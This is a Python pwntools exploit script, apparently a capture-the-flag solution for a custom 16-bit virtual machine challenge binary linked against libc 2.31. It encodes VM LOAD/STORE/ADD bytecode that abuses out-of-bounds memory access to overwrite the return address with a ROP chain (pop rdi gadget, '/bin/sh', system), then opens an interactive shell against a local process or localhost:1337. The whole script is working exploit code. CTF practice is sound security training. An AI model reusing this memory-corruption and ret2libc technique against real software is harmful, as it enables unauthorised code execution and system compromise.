from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *run
b *run+785
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

ADD   = 0 
XOR   = 1 
END   = 3
LOAD  = 4
STORE = 6

def flatte(tupl):
    res = b""
    for i in tupl:
        res += p16(i)
    return res

def ins(opcode,r1,r2,offset):
    return p16( (0x0) | ((opcode & 0x7) << 13) | ((r1 & 0x7) << 3) | (r2 & 0x7) | ((offset & 0x7f) << 0x6))

NUL = 0  # SET TO 0
REG1 = 1 # OFFSET REGISTER
REG2 = 2 # SET TO 1
REG3 = 3 # TEMP REG
REG4 = 4 # TEMP REG
REG5 = 5 # LIBC L16
REG6 = 6 # LIBC 32-16
REG7 = 7 # LIBC 

RETADDR = 0x102c
LIBOFF = 0x24083
DAT = 0x4f
POPRDI = 0x512
BINSH0 = 0x53a
BINSH1 = 0x19
SYSTEM0 = 0x720d + 27
SYSTEM1 = 0x3

# ===============================
# INSTRUCTIONS - WE WILL HAVE TO JUMP AFTER 7F
b  = (
    # LOAD LIBC OFFSET
    ins(LOAD,REG1,NUL,DAT)   +
    ins(LOAD,REG2,NUL,DAT+1) +
    ins(ADD,REG1,REG2,0x0)   +
    # SET REG2 = 1, REG3 = 4
    ins(LOAD,REG2,NUL,DAT+2) +
    ins(LOAD,REG4,NUL,DAT+3)  +
    # LOADING LIBC ADDR IN R5-R7
    # SETTING POPRDI
    ins(LOAD,REG5,REG1,0x0)  +
    ins(ADD,REG4,REG5,0x0)   + 
    ins(STORE,REG4,REG1,0x0) + 
    ins(ADD,REG1,REG2,0x0)   +
    ins(LOAD,REG6,REG1,0x0)  +
    ins(ADD,REG1,REG2,0x0)   +
    ins(LOAD,REG7,REG1,0x0)  +
    ins(ADD,REG1,REG2,0x0)   +
    ins(ADD,REG1,REG2,0x0)   +
    # SETTING BINSH
    ins(LOAD,REG4,NUL,DAT+4) + # SETTING LOW 16 BITS
    ins(ADD,REG4,REG5,0x0)   + 
    ins(STORE,REG4,REG1,0x0) + 
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 32-16
    ins(LOAD,REG4,NUL,DAT+5) +
    ins(ADD,REG4,REG6,0x0)   + 
    ins(STORE,REG4,REG1,0x0) + 
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 48-32 
    ins(STORE,REG7,REG1,0x0) +  
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 64-48
    ins(STORE,NUL,REG1,0x0)  +
    ins(ADD,REG1,REG2,0x0)   +
    # SETTING SYSTEM 
    ins(LOAD,REG4,NUL,DAT+6) + # SETTING LOW 16 BITS
    ins(LOAD,REG3,NUL,DAT)   + 
    ins(ADD,REG4,REG3,0x0)   + 
    ins(ADD,REG4,REG5,0x0)   + 
    ins(STORE,REG4,REG1,0x0) + 
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 32-16
    ins(LOAD,REG4,NUL,DAT+7) +
    ins(ADD,REG4,REG6,0x0)   + 
    ins(STORE,REG4,REG1,0x0) + 
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 48-32 
    ins(STORE,REG7,REG1,0x0) +  
    ins(ADD,REG1,REG2,0x0)   + # SETTING BITS 64-48
    ins(STORE,NUL,REG1,0x0)  +
    ins(ADD,REG1,REG2,0x0)   +
    # BYE BYE
    ins(END,NUL,NUL,0x0))

# ===============================
# DATA SECTION
data = flatte((0x7000,(RETADDR - 0x1),0x1,POPRDI,BINSH0,BINSH1,SYSTEM0,SYSTEM1))

# ===============================
# EVERYTHING ELSE 
byteCode = (b.ljust((DAT)*0x2,b"\x00") + data)
code = p16(len(byteCode)//2) + byteCode 
sl(code)

io.interactive()
